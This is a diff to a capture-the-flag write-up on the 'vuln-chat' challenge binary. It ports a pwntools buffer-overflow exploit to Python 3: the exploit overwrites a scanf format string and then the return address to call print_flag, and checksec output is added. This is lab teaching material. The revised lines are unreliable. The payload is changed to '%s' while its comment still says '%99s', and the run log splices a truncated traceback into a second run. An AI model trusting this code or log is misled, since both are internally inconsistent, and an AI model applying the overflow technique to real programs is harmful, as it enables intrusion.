@@ -5,6 +5,13 @@ Let's take a look at the binary:
 ```
 $    file vuln-chat
 vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
+$   pwn checksec vuln-chat
+[*] '/Hackery/nightmare/modules/05-bof_callfunction/tu17_vulnchat/vuln-chat'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
 $    ./vuln-chat
 ----------- Welcome to vuln-chat -------------
 Enter your username: 15935728
@@ -180,22 +187,22 @@ from pwn import *
 target = process('./vuln-chat')
 
 # Print the initial text
-print target.recvuntil("username: ")
+print(target.recvuntil(b"username: "))
 
 # Form the first payload to overwrite the scanf format string
-payload0 = ""
-payload0 += "0"*0x14 # Fill up space to format string
-payload0 += "%99s" # Overwrite it with "%99s"
+payload0 = b""
+payload0 += b"0"*0x14 # Fill up space to format string
+payload0 += b"%s" # Overwrite it with "%99s"
 
 # Send the payload with a newline character
 target.sendline(payload0)
 
 # Print the text up to the second scanf call
-print target.recvuntil("I know I can trust you?")
+print(target.recvuntil(b"I know I can trust you?"))
 
 # From the second payload to overwrite the return address
-payload1 = ""
-payload1 += "1"*0x31 # Filler space to return address
+payload1 = b""
+payload1 += b"1"*0x31 # Filler space to return address
 payload1 += p32(0x804856b) # Address of the print_flag function
 
 # Send the second payload with a newline character
@@ -208,21 +215,23 @@ target.interactive()
 When we run it:
 
 ```
-$    python exploit.py
-[+] Starting local process './vuln-chat': pid 9724
------------ Welcome to vuln-chat -------------
-Enter your username:
-Welcome 00000000000000000000%99s!
-Connecting to 'djinn'
---- 'djinn' has joined your chat ---
-djinn: I have the information. But how do I know I can trust you?
+$   python3 exploit.py
+[+] Starting local process './vuln-chat': pid 9895
+b'----------- Welcome to vuln-chat -------------\nEnter your username: '
+b"Welcome 00000000000000000000%s!\nConnecting to 'djinn'\n--- 'djinn' has joined your chat ---\ndjinn: I have the information. But how do I know I can trust you?"
+Traceback (most recent call last):
+  File "exploit.py", line 22, in <module>
+    payload1 += b"1"*0x31 # Filler space to return address
+[+] Starting local process './vuln-chat': pid 9906
+b'----------- Welcome to vuln-chat -------------\nEnter your username: '
+b"Welcome 00000000000000000000%s!\nConnecting to 'djinn'\n--- 'djinn' has joined your chat ---\ndjinn: I have the information. But how do I know I can trust you?"
 [*] Switching to interactive mode
 
-00000000000000000000%99s: djinn: Sorry. That's not good enough
+00000000000000000000%s: djinn: Sorry. That's not good enough
 flag{g0ttem_b0yz}
 Use it wisely
 [*] Got EOF while reading in interactive
 $  
 ```
 
-Just like that we got a shell!
+Just like that we got the flag!
